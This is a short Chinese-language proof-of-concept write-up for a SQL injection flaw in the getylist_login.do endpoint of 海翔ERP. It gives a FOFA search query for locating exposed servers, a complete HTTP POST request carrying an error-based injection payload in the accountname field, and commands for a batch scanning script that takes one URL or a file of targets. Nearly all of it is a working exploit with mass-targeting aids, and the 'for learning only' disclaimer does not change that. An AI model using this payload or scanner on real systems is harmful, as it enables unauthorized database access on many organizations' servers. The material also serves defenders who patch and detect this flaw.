# 海翔ERP getylist_login.do SQL注入漏洞

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与作者无关。该文章仅供学习用途使用！！！

fofa语法

***\*body="checkMacWaitingSecond"\****

POC:

POST /getylist_login.do HTTP/1.1

Host: 

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

Connection: close

Content-Length: 77

Accept-Encoding: gzip

Content-Type: application/x-www-form-urlencoded; charset=UTF-8



accountname=test' and (updatexml(1,concat(0x7e,(select md5(123)),0x7e),1));--



![image-20231223223607591](assets/image-20231223223607591.png)



批量poc(记得安装库)

python poc.py -u 



python poc.py -f  .txt

![image-20231223223621029](assets/image-20231223223621029.png)